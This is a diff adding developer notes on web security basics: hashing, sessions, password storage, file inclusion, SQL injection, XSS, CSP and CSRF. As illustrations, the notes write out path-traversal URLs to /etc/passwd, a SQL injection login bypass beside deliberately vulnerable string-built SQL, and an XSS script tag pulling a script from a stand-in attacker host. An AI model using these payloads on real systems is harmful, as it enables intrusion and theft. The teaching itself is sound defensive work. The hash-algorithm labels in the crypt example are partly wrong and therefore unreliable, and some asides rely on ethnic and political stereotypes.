@@ -1,0 +1,198 @@
+{{{ Web Security
+}}}
+
+{{{ Basics
+
+Hash
+* "one way function" - hash(x): quick and easy, inv(hash(x)): very slow and expensive
+* any string => fixed length string, with low probability of collision
+* passwords, file integrity verification
+
+Encryption
+* symmetric
+  * quick/easy
+  * encryption / decryption keys are the same
+  * both party need to know the secret
+  * how to distribute it?
+  * DES, 3DES, AES, IDEA, ...
+* asymmetric (public key) (SSL, HTTPS)
+  * more expensive/slow
+  * key-pairs - public + private
+  * everyone have access to the public key
+  * key exchange is easy (if you TRUST the source - MITM)
+  * RSA, DSA, elliptic curve based, ...
+  * can be used to SIGN content (authenticate, integrity, can't deny)
+  * can be used to distribute symmetric keys (Diffie-Hellmann key exchange, ...)
+
+}}}
+
+{{{ User information
+
+Cookies
+* only for the same domain
+* easy to use, stored in the browser
+* cannot be trusted, client can modify the data
+* "server only" - cannot be modified w/ JS (in a standard browser)
+* "secure" - sent only over secure channel (HTTPS) (in a standard browser)
+
+Sessions
+* stored on server side
+* the client knows the session id
+* if an attacker knows your session id, he can use your session
+* session id in URLs - not a good idea, easy to steal
+* session id in cookies - can be more secure
+  * secure
+  * server only
+  * expires
+  * bound to something client specific (IP address [but mobile...], user agent)
+
+Signed cookies
+* data on client side, signed by the server, with expiery
+* can be trusted, client cannot modify the data w/o signature corruption
+
+JWT (JSON Web Token)
+* "standardized" signed cookies (using custom header instead of cookies)
+* lot of libraries
+* easy SSO (no cookie limitations, can be cross domain)
+* use with care (might have some flaws)
+
+}}}
+
+{{{ Storing passwords
+
+#1 As plain text
+
+* we're not T-Systems :(
+* DO NOT EVER
+
+#2 As a simple hash
+
+* not a good idea
+* "rainbow tables" - pre-generated searchable hashes
+
+#3 Salted hash
+
+* much better, especially if you use per-password salts
+* (rainbow table for a specific salt/algorithm pair can be generated "quickly" using GPUs)
+
+Summary
+* use random generated salts for each password
+* use "slow" hash algorithms
+* store hash algorithm as well, it can be upgraded later if there's a security flaw
+
+Something like: $alg$veryrandomsalt$hashedpassword (Linux shadow)
+
+```
+#md5
+py> crypt.crypt('nem igazi jelszo', '$1$saltsalt')
+'$1$saltsalt$vQbMk4l2lRc5Nr/elLy970'
+
+#sha1
+py> crypt.crypt('nem igazi jelszo', '$5$saltsalt')
+
+#sha512
+'$5$saltsalt$YgzPiIYuBL6dqAnD1icVdvGnZRxKjm3nb.akiwHaPb3'
+py> crypt.crypt('nem igazi jelszo', '$6$saltsalt')
+'$6$saltsalt$5Svv7/14kYtcAMAjbHEQ/J8H.X9RyKNEh8XD2/ppt9MYH57eXgeWQ.o0RJfoovtzlJT1kVEcIDaUKyd8yL6jp1'
+```
+
+}}}
+
+{{{ File inclusion
+
+Sometimes you have to include files into your application based on data coming from the internet.
+NEVER TRUST ANY DATA COMING FROM THE INTERNET.
+
+#1 Do not do such thing.
+Best solution.
+
+http://buta.vok/svg.jsp?file=../../../etc/passwd
+
+#2 Unescape / URL decode properly
+Do not rely on "file extensions" or removing the "../"s from the beginning.
+
+http://buta.vok/svg.jsp?file=%2E%2E/%2E%2E/%2E%2E/etc/passwd%00.svg
+
+#3 Resolve absolute path, restrict access to a specific directory
+
+#4 DO NOT EVER INCLUDE EXECUTABLE CODE IN THIS WAY
+Used to be a general solution among PHP developers, PHP let you even import files from the internet.
+
+}}}
+
+{{{ SQL Injection (very brief)
+
+SQL code for user login:
+
+```
+user = SQL("select * from users where email='"+email_from_user_input+"' and password='"+hashed_password_from_user_input+"';");
+```
+
+Regular user input:
+  email: alma@beka.com
+  password: cica!1234
+Works, great success!
+
+Member of evil hacker organization (funded by Soros ofc.):
+  email: ' or user_id=1; --
+  password: idontcare
+Well, he's the admin[uid=1].
+
+If you can't use an ORM, use prepared statements. Most probably you cannot escape properly anything coming from untrusted sources.
+But anyway NEVER TRUST USER INPUT.
+
+}}}
+
+{{{ XSS (very brief)
+
+Scenario:
+Search page, search term shown at the top of the page.
+
+Regular user:
+  Search for: apple
+  Apples are shown.
+
+Malevolent east-european public transport user:
+  Searches for: apple<script src="//h4x0rz.0rg/sendmethecreditcardnumberlater.js"></script>
+  Apples are shown.
+  Put's a direct link into forum pointing to this exact page with a text like, "Look at these fine apples, they must be delecious."
+  You click on the link, buy some apple, and a few days later you buy someone an iPhone in Moscow.
+
+Rules:
+* DO NOT TRUST ANY USER INPUT, OR ANYTHING COMING FROM UNTRUSTED SOURCES
+* untrusted source: everything that is not the code written by you (well, do not trust even that, but anyway)
+* escape everything according to usage (html escape/sanitize html content, carefully - or not at all - add html properties or css rules based on user input)
+
+}}}
+
+{{{ CSP - Content Security Policy
+
+CSP helps preventing XSS attacks, tells the browser the valid sources of different content types.
+
+https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+
+}}}
+
+{{{ CSRF - Cross Site Request Forgery
+
+Malcious site sends requests to other site with the current users credentials.
+
+Example:
+  Press the button to see the funny video.
+  POSTs a request to the users bank to transfer some money to the attacker.
+
+Solutions:
+* check the 'Origin' header (if present) - not easy to do with multiple environments
+* use CSRF token (random token, updated by every request, bound to user session), that is required for state changing operations (POST/PUT/DELETE)
+* modern browsers block cross-origin AJAX requests by default - you can use CORS (cross-origin resource sharing), but know what you are doing!
+
+}}}
+
+{{{
+
+  NEVER TRUST ANYTHING COMING FROM THE INTERNET
+
+}}}
+
+# vim: foldmethod=marker
+
